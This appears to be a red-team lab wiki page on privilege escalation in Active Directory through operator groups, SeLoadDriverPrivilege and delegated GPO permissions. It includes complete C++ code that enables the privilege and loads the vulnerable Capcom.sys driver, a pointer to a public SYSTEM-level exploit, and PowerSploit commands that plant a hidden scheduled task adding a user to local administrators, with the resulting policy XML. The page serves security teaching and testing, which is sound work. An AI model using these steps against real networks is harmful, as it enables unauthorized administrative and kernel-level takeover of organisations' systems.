# Privileged Accounts and Token Privileges

Administrators, Domain Admins, Enterprise Admins are well known AD groups that allow for privilege escalation, that pentesters and red teamers will aim for in their engagements, but there are other account memberships and access token privileges that can also be useful during security assesments when chaining multiple attack vectors.

### Account Operators

* Allows creating non administrator accounts and groups on the domain
* Allows logging in to the DC locally

Note the spotless' user membership:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTx62tAa4ydjhz6ZZzI%2F-LTx6i9cMfOTta_TgJkZ%2FScreenshot%20from%202018-12-17%2017-01-38.png?alt=media\&token=a545cf9f-7bb8-4566-8d17-5e3c50e60a7c)

However, we can still add new users:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTx62tAa4ydjhz6ZZzI%2F-LTx6j_Iead_CNebgMJV%2FScreenshot%20from%202018-12-17%2017-01-47.png?alt=media\&token=e0b4021e-ade0-4e03-8d58-0817803b855e)

As well as login to DC01 locally:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTx62tAa4ydjhz6ZZzI%2F-LTx7ZTZaGT0aJmV4ISE%2FScreenshot%20from%202018-12-17%2017-05-35.png?alt=media\&token=7a185bdd-fe41-40a2-9083-c10669036e84)

### Server Operators

This membership allows users to configure Domain Controllers with the following privileges:

* Allow log on locally
* Back up files and directories
* Change the system time
* Change the time zone
* Force shutdown from a remote system
* Restore files and directories
* Shut down the system

Note how we cannot access files on the DC with current membership:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTxBjvedQD59i7Lqvjh%2F-LTxF30kj5kTOqepO4DK%2FScreenshot%20from%202018-12-17%2017-38-43.png?alt=media\&token=5bfef9b9-8414-451e-822f-e20291059cf9)

However, if the user belongs to `Server Operators`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTxBjvedQD59i7Lqvjh%2F-LTxFAt8hZiPk2gFEOVG%2FScreenshot%20from%202018-12-17%2017-38-58.png?alt=media\&token=d30c5f83-6bad-4733-bf8f-df44198da0a3)

The story changes:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTxBjvedQD59i7Lqvjh%2F-LTxFH9qAsohsIcc9tSm%2FScreenshot%20from%202018-12-17%2017-39-08.png?alt=media\&token=73c5fd54-96af-49f5-a944-904a1c85452f)

### Backup Operators

As with `Server Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTxFe01dkUp95p44dNE%2F-LTxFsmrRbaPg-_-2Fgj%2FScreenshot%20from%202018-12-17%2017-42-47.png?alt=media\&token=6d4ddbe0-1a78-422f-b55c-d21e62e1f131)

### SeLoadDriverPrivilege

A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka `NT\System`. See how `offense\spotless` user has this privilege:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyHQKnQCI2htdbX6G2%2F-LTyK0ejR4KyPa4fpTAR%2FScreenshot%20from%202018-12-17%2022-40-30.png?alt=media\&token=39fe6389-6b18-4322-8afc-5346c6f860c6)

`Whoami /priv` shows the privilege is disabled by default:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyHQKnQCI2htdbX6G2%2F-LTyKDqYVV1XFCM0SClP%2FScreenshot%20from%202018-12-17%2021-59-15.png?alt=media\&token=e93b916d-fab1-4160-ba6a-a175ea4b5e5e)

However, the below code allows enabling that privilege fairly easily:

{% code title="privileges.cpp" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	system("cmd");
    return 0;
}
```
{% endcode %}

We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now enabled:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyHQKnQCI2htdbX6G2%2F-LTyLH-MWOkrcKqPv4r3%2FScreenshot%20from%202018-12-17%2022-45-54.png?alt=media\&token=35d18f5e-36fb-4ff0-befd-40bf33a63ded)

#### Capcom.sys Driver Exploit

To further prove the `SeLoadDriverPrivilege` is dangerous, let's exploit it to elevate privileges.

Let's build on the previous code and leverage the Win32 API call `ntdll.NtLoadDriver()` to load the malicious kernel driver `Capcom.sys`. Note that lines 55 and 56 of the `privileges.cpp` are:

```cpp
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\registry\\machine\\System\\CurrentControlSet\\Services\\SomeService";
```

The first one declares a string variable indicating where the vulnerable Capcom.sys driver is located on the victim system and the second one is a string variable indicating a service name that will be used (could be any service) when executing the exploit:

{% code title="privileges.cpp" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	//system("cmd");
	// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
	std::cout << "[+] Set Registry Keys" << std::endl;
	NTSTATUS st1;
	UNICODE_STRING pPath;
	UNICODE_STRING pPathReg;
	PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
	PCWSTR pPathSourceReg = L"\\registry\\machine\\System\\CurrentControlSet\\Services\\SomeService";
	const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
	HMODULE hObsolete = GetModuleHandleA(NTDLL);
	*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
	*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
	*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

	RtlInitUnicodeString(&pPath, pPathSource);
	RtlInitUnicodeString(&pPathReg, pPathSourceReg);
	st1 = NtLoadDriver(&pPathReg);
	std::cout << "[+] value of st1: " << st1 << "\n";
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver Loaded as Kernel..\n";
		std::cout << "[+] Press [ENTER] to unload driver\n";
	}

	getchar();
	st1 = NtUnloadDriver(&pPathReg);
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver unloaded from Kernel..\n";
		std::cout << "[+] Press [ENTER] to exit\n";
		getchar();
	}

    return 0;
}
```
{% endcode %}

Once the above code is compiled and executed, we can see that our malicious `Capcom.sys` driver gets loaded onto the victim system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyWzFCfAHYYzM7B4JU%2FScreenshot%20from%202018-12-17%2022-14-26.png?alt=media\&token=50412dcd-4547-408f-a130-8e506824ba2e)

We can now download and compile the Capcom exploit from [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) and execute it on the system to elevate our privileges to `NT Authority\System`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyXqhussGJVTLXtiv4%2FScreenshot%20from%202018-12-17%2023-40-56.png?alt=media\&token=a3967d5d-7c3b-491a-aaaa-de57acdd3a0e)

### GPO Delegation

Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LU0og1xoZURnLNqeTl2%2F-LU0osxFbkS-f65Eq-mk%2FScreenshot%20from%202018-12-18%2014-58-34.png?alt=media\&token=4cedc52b-9f9e-4d03-aa00-3123a1008918)

We can see this by leveraging PowerView like so:

{% code title="attacker\@victim" %}
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
{% endcode %}

The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LU0og1xoZURnLNqeTl2%2F-LU0ouXjPBt-6c935Sg9%2FScreenshot%20from%202018-12-18%2014-57-21.png?alt=media\&token=76a84698-f25c-41ff-bab3-91f22d1d7d0b)

More about general AD ACL/ACE abuse refer to the lab:

#### Abusing the GPO Permissions

We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LU0og1xoZURnLNqeTl2%2F-LU0qS-w1r8Yl2EAwJ8i%2FScreenshot%20from%202018-12-18%2015-05-25.png?alt=media\&token=4cf9b97f-4083-4a4c-a315-0738ee306dc4)

If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:

```csharp
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUAONoTnpFab60LOMN8%2F-LUAQX8hJKJAgIq-DjKb%2FScreenshot%20from%202018-12-20%2011-41-55.png?alt=media\&token=ad76a386-97c1-40d5-8029-676f9ff84a16)

**Computers with a Given Policy Applied**

We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:

```csharp
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

![ws01.offense.local has "Misconfigured Policy" applied to it](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUAONoTnpFab60LOMN8%2F-LUAQYr4Kk2056DbNQ7b%2FScreenshot%20from%202018-12-20%2011-42-04.png?alt=media\&token=5b86cc58-cdbe-4b6e-b173-e045eb2a1cff)

**Policies Applied to a Given Computer**

```csharp
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**OUs with a Given Policy Applied**

```csharp
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

**Abusing Weak GPO Permissions**

One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:

```csharp
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUAONoTnpFab60LOMN8%2F-LUAqx9nlqAD9T50ON2b%2FScreenshot%20from%202018-12-20%2013-43-46.png?alt=media\&token=262991d6-f546-4d86-a059-0d84a81b440d)

The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUAONoTnpFab60LOMN8%2F-LUAr6Xq05z-EfZfbkbI%2FScreenshot%20from%202018-12-20%2013-40-11.png?alt=media\&token=1124da26-17ea-4317-ae11-9f5cf008729b)

#### Force Policy Update

ScheduledTask and its code will execute after the policy updates are pushed through (roughly each 90 minutes), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUAONoTnpFab60LOMN8%2F-LUArIwm3z8uCrZyWpPd%2FScreenshot%20from%202018-12-20%2013-45-18.png?alt=media\&token=6fa8a128-800d-4cab-8fc6-6589da930c24)

#### Under the hood

If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUAONoTnpFab60LOMN8%2F-LUAUsiOp1wPCBZZyS-9%2FScreenshot%20from%202018-12-20%2012-02-22.png?alt=media\&token=f4555696-fd7a-4772-a9ab-d69bc97b1c38)

Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:

{% code title="\offense.local\SysVol\offense.local\Policies{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description></Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>cmd</Command>
                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

#### Users and Groups

The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
            <Members>
                <Member name="spotless" action="ADD" sid="" />
            </Members>
        </Properties>
    </Group>
</Groups>
```
{% endcode %}

Additionally, we could think about leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.

### References

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}
